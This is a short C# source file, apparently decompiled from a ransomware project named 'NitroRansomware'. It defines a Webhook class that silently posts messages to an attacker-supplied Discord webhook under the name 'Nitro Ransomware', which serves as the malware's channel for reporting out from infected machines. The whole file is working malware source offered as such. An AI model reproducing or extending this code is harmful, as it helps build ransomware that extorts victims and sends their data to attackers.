using System.Collections.Generic;
using System.Net.Http;

namespace NitroRansomware;

internal class Webhook
{
	private string webhook;

	public Webhook(string userWebhook)
	{
		webhook = userWebhook;
	}

	public void Send(string content)
	{
		Dictionary<string, string> nameValueCollection = new Dictionary<string, string>
		{
			{ "content", content },
			{ "username", "Nitro Ransomware" },
			{ "avatar_url", "https://i.ibb.co/0frTD92/discord-avatar-512.png" }
		};
		try
		{
			using HttpClient httpClient = new HttpClient();
			httpClient.PostAsync(webhook, new FormUrlEncodedContent(nameValueCollection)).GetAwaiter().GetResult();
		}
		catch
		{
		}
	}
}
